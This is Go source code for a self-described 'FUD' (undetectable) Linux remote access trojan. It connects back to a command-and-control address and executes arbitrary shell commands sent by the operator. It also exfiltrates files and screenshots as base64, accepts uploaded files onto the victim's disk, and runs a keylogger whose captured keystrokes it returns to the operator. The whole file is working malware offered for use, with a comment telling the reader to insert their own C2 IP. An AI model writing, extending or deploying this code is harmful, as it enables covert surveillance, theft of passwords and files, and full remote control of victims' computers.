// Author : Nemuel Wainaina
/*
	FUD Linux Remote Access Trojan
*/

package main

import (
	"bufio"
	b64 "encoding/base64"
	"fmt"
	"image/png"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/kbinani/screenshot"
	"github.com/MarinX/keylogger"
)

const (
	// replace the C2 variable with your C2 IP and port to connect to
	C2 string = "127.0.0.1:54321"
)

var (
	scrshot string = "scrshot.png"
	keylog_flag int = 0
	logfile string = "logs.txt"
)

func main() {
	conn, _ := connect_home()

	for {
		msg, _ := bufio.NewReader(conn).ReadString('\n')
		cmd := strings.TrimSpace(string(msg))

		if cmd == "q" || cmd == "quit" {
			send_resp(conn, "Closing connection")
			conn.Close()
		} else if cmd[0:2] == "cd" {
			if cmd == "cd" {
				result, err := os.Getwd()
				if err != nil {
					send_resp(conn, err.Error())
				} else {
					send_resp(conn, result)
				}
			} else {
				tgt_dir := strings.Split(cmd, " ")[1]
				if err := os.Chdir(tgt_dir); err != nil {
					send_resp(conn, err.Error())
				} else {
					cur_wd, _ := os.Getwd()
					send_resp(conn, fmt.Sprintf("Dir changed successfully to %s", cur_wd))
				}
			}
		} else if cmd == "capturescr" {
			result := take_screenshot()
			send_resp(conn, fmt.Sprintf("img:%s", result))
		} else if strings.Split(cmd, ":")[0] == "file" {
			// receiving file from C2
			tmp := strings.Split(cmd, ":")
			b64_string := tmp[1]
			file_name := tmp[2]
			if !save_file(file_name, b64_string) {
				send_resp(conn, fmt.Sprintf("Failed to save %s", file_name))
			} else {
				send_resp(conn, fmt.Sprintf("%s saved successfully", file_name))
			}
		} else if strings.Split(cmd, " ")[0] == "download" { 
			tgt_file := strings.Split(cmd, " ")[1]
			result := get_file(tgt_file)
			send_resp(conn, result)
		} else if cmd == "keylog_start" {
			if keylog_flag == 1 {
				send_resp(conn, "Keylogger already running")
			} else {
				go log_keystrokes()
				send_resp(conn, "Keylogger started successfully")
			}
		} else if cmd == "keylog_stop" { 
			keylog_flag = 0
			send_resp(conn, dump_keystrokes())
		} else {
			send_resp(conn, exec_cmd(cmd))
		}
	}
}

func connect_home() (net.Conn, error) {
	conn, err := net.Dial("tcp", C2)
	if err != nil {
		time.Sleep(15e9)
		connect_home()
	}
	return conn, err
}

// send the response back to the C2Server
func send_resp(conn net.Conn, resp string) {
	tmp := ""
	if resp[len(resp)-1] == '\n' {
		tmp = "\n"
	} else {
		tmp = "\n\n"
	}
	if resp == "Closing connection" {
		fmt.Fprintf(conn, "%s%s", resp, tmp)
	} else {
		fmt.Fprintf(conn, "%s%s# ", resp, tmp)
	}
}

// execute a shell command and return the result
func exec_cmd(cmd string) string {
	result, err := exec.Command(cmd).Output()
	if err != nil {
		return err.Error()
	} else {
		return string(result)
	}
}

// check whether or not a file exists
func file_exists(file string) (bool) {
	if _, err := os.Stat(file); err != nil {
		return false
	} else {
		return true
	}
}

// read a file and return base64 encoding of its contents
func file_b64(file string) (string) {
	content, _ := os.ReadFile(file)
	return b64.StdEncoding.EncodeToString(content)
}

// return the base64 encoding of a file on victim's device
func get_file(file string) (string) {
	if !file_exists(file) {
		return "File not found"
	} 
	return file_b64(file)
}

// save the uploaded file to victim's device
func save_file(file string, b64_string string) (bool) {
	content, _ := b64.StdEncoding.DecodeString(b64_string)
	if err := os.WriteFile(file, content, 0644); err != nil {
		return false
	} else {
		return true
	}
}

// take a screenshot, return its base64 value and then clean up
func take_screenshot() (string) {
	bnds := screenshot.GetDisplayBounds(0)
	img, _ := screenshot.CaptureRect(bnds)
	file, _ := os.Create(scrshot)
	defer file.Close()
	png.Encode(file, img)
	b64_string := file_b64(scrshot)
	os.Remove(scrshot)
	return b64_string
}

// log keystrokes for a specific amount of time
func log_keystrokes() {
	keyboard := keylogger.FindKeyboardDevice()
	os.Create(logfile)
	file, _ := os.OpenFile(logfile, os.O_APPEND, 0644)
	if len(keyboard) <= 0 {
		file.WriteString("No keyboard found :(")
	}
	if k, err := keylogger.New(keyboard); err != nil {
		file.WriteString(err.Error())
	} else {
		events := k.Read()
		for e := range events {
			switch e.Type {
			case keylogger.EvKey:
				if e.KeyRelease() {
					file.WriteString(e.KeyString())
				}
			}
		}
	}
}

// return base64 of the keystroke logs
func dump_keystrokes() (string) {
	keystroke_dump := file_b64(logfile)
	os.Remove(logfile)
	return keystroke_dump
}